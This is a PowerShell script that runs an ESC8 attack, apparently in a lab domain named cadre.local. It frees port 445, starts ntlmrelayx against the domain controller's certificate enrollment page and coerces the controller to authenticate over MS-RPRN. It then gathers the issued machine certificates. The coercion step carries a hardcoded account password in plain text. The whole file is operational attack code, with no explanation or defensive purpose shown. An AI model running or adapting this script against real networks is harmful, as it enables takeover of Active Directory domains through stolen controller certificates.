# ESC8 (WT052) - definitive: firewall rules present, SMB stack disabled, relay on 445,
# coerce dc01$ MS-RPRN as chief_command, Machine template, UnPAC-capable cert.
# Restores SMB stack in finally.
$ErrorActionPreference = "Stop"
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
$work = "C:\Tools\cadre-attack"
Set-Location $work

function Restore-SMBStack {
  sc.exe config LanmanServer start= auto | Out-Null
  sc.exe config srv2 start= demand | Out-Null
  sc.exe config srvnet start= demand | Out-Null
  sc.exe start srvnet | Out-Null
  sc.exe start srv2 | Out-Null
  Start-Sleep -Seconds 2
  Start-Service LanmanServer -ErrorAction SilentlyContinue
  Write-Output "smb_restored lanman=$( (Get-Service LanmanServer -ErrorAction SilentlyContinue).Status )"
}

try {
  Write-Output "=== STEP 0: firewall rules present? ==="
  $f445 = [bool](Get-NetFirewallRule -DisplayName "ESC8-Allow-445" -ErrorAction SilentlyContinue)
  $f80 = [bool](Get-NetFirewallRule -DisplayName "ESC8-Allow-80" -ErrorAction SilentlyContinue)
  Write-Output "fw445=$f445 fw80=$f80"
  if (-not ($f445 -and $f80)) { throw "firewall rules missing" }

  Write-Output "=== STEP 1: disable SMB stack ==="
  sc.exe config LanmanServer start= disabled | Out-Null
  sc.exe config srv2 start= disabled | Out-Null
  sc.exe config srvnet start= disabled | Out-Null
  Stop-Service LanmanServer -Force -ErrorAction SilentlyContinue
  sc.exe stop srv2 | Out-Null
  sc.exe stop srvnet | Out-Null
  Start-Sleep -Seconds 5

  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  if ($c) { throw "445 still bound after disable (pid $($c.OwningProcess))" }
  Write-Output "port445_free"

  Write-Output "=== STEP 2: start ntlmrelayx (ADCS target, port 445) ==="
  $relayLog = Join-Path $work "esc8-relay.log"
  Remove-Item $relayLog,(Join-Path $work "esc8-relay.err") -ErrorAction SilentlyContinue
  $relayArgs = "-t http://dc01.cadre.local/certsrv/certfnsh.asp --adcs --template Machine -smb2support -ip 192.168.77.62"
  $p = Start-Process -FilePath "python" -ArgumentList "$py\ntlmrelayx.py $relayArgs" -WorkingDirectory $work `
    -RedirectStandardOutput $relayLog -RedirectStandardError (Join-Path $work "esc8-relay.err") `
    -PassThru -WindowStyle Hidden
  Write-Output "relay_pid=$($p.Id)"
  Start-Sleep -Seconds 8

  $c = Get-NetTCPConnection -LocalPort 445 -State Listen -ErrorAction SilentlyContinue
  Write-Output "445_relay_listening=$([bool]$c)"

  Write-Output "=== STEP 3: coerce dc01 via coercer MS-RPRN (as chief_command) ==="
  $env:PYTHONIOENCODING = "utf-8"
  $coercerLog = Join-Path $work "esc8-coercer.log"
  Remove-Item $coercerLog -ErrorAction SilentlyContinue
  & "C:\Tools\RedStrike\.venv\Scripts\coercer.exe" coerce -u chief_command -p "C0mm@nd_Ch1ef!" -d cadre.local --dc-ip 192.168.77.10 -t 192.168.77.10 -l 192.168.77.62 --filter-protocol-name MS-RPRN --auth-type smb --always-continue 2>&1 | Out-File $coercerLog -Encoding UTF8 -Force
  Write-Output "coerce_rc=$LASTEXITCODE"
  Start-Sleep -Seconds 15

  Write-Output "=== STEP 4: coercer log tail ==="
  Get-Content $coercerLog -Tail 30 -ErrorAction SilentlyContinue

  Write-Output "=== STEP 5: relay log tail ==="
  Get-Content $relayLog -Tail 50 -ErrorAction SilentlyContinue
  Write-Output "--- relay stderr ---"
  Get-Content (Join-Path $work "esc8-relay.err") -Tail 10 -ErrorAction SilentlyContinue

  Write-Output "=== STEP 6: check for issued certs ==="
  $pfx = Get-ChildItem $work -Filter "*.pfx" | Sort-Object LastWriteTime -Descending | Select-Object -First 8
  $pfx | Format-Table Name,Length,LastWriteTime -AutoSize

  Write-Output "=== STEP 7: stop relay ==="
  Stop-Process -Id $p.Id -Force -ErrorAction SilentlyContinue
  Write-Output "relay_stopped"
} finally {
  Restore-SMBStack
}
